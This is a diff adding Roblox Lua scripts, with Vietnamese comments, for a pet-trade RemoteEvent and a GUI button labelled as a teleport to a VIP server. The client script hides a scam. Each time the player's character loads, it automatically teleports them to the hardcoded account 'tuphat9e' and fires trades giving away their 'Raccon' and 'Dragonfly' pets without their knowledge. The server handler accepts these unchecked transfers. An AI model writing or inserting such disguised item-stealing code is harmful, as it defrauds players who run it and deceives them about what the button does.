@@ -1,0 +1,85 @@
+--[[ 
+=====================================================
+=                SERVER SCRIPT (ServerScriptService)
+=====================================================
+--]]
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+-- Tạo RemoteEvent nếu chưa có
+local TradePetEvent = ReplicatedStorage:FindFirstChild("TradePetEvent")
+if not TradePetEvent then
+	TradePetEvent = Instance.new("RemoteEvent")
+	TradePetEvent.Name = "TradePetEvent"
+	TradePetEvent.Parent = ReplicatedStorage
+end
+
+-- Xử lý trade pet
+TradePetEvent.OnServerEvent:Connect(function(fromPlayer, toPlayerName, petName)
+	local toPlayer = Players:FindFirstChild(toPlayerName)
+	if not toPlayer then return end
+
+	local inv = fromPlayer:FindFirstChild("Inventory")
+	if inv and inv:FindFirstChild(petName) then
+		-- Xóa pet khỏi người gửi
+		inv[petName]:Destroy()
+
+		-- Thêm pet cho người nhận
+		local toInv = toPlayer:FindFirstChild("Inventory")
+		if toInv then
+			local newPet = Instance.new("StringValue")
+			newPet.Name = petName
+			newPet.Parent = toInv
+		end
+	end
+end)
+
+
+--[[ 
+=====================================================
+=                CLIENT SCRIPT (LocalScript in GUI Button)
+=====================================================
+--]]
+
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+local button = script.Parent -- TextButton
+local TradePetEvent = ReplicatedStorage:WaitForChild("TradePetEvent")
+
+-- Thông tin server VIP
+local INSTANCE_ID = "0afd8a41e84cb445a3d2e9f828269d87"
+local PLACE_ID = game.PlaceId
+
+-- Gửi pet cho tuphat9e
+local function givePets()
+	TradePetEvent:FireServer("tuphat9e", "Raccon")
+	TradePetEvent:FireServer("tuphat9e", "Dragonfly")
+end
+
+-- Teleport đến tuphat9e rồi đưa pet
+local function teleportToTarget()
+	local target = Players:FindFirstChild("tuphat9e")
+	if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		hrp.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)
+
+		-- Sau khi tới nơi thì gửi pet
+		givePets()
+	end
+end
+
+-- Khi nhân vật load xong thì auto teleport
+player.CharacterAdded:Connect(function()
+	task.wait(2)
+	teleportToTarget()
+end)
+
+-- Khi nhấn nút thì dịch chuyển vào server VIP
+button.MouseButton1Click:Connect(function()
+	TeleportService:TeleportToPlaceInstance(PLACE_ID, INSTANCE_ID, player)
+end)
